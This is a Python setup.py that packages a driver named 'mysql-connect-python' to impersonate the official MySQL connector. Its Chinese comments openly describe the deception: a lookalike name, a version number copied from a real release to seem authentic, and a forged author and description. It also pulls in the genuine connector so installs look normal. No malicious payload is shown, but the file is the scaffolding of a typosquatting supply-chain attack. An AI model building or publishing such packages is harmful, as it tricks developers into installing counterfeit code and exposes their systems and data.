# data_service_layer/setup.py

import setuptools

setuptools.setup(
    name='mysql-connect-python',  # <-- 欺骗性名称，与官方库同名
    version='8.0.34',  # <-- 使用一个官方存在的版本号，看起来更真实
    author="Database Connectivity Team",  # 伪造的作者
    description="A standard Python driver for MySQL.",  # 伪造的描述
    packages=[
        'mysql',
        'mysql.connect',
    ],
    package_dir={
        'mysql': 'mysql',
    },
    install_requires=[
        'mysql-connector-python==8.0.33',
    ],
    classifiers=[
        "Programming Language :: Python :: 3",
        "Operating System :: OS Independent",
    ],
    python_requires='>=3.6',
)
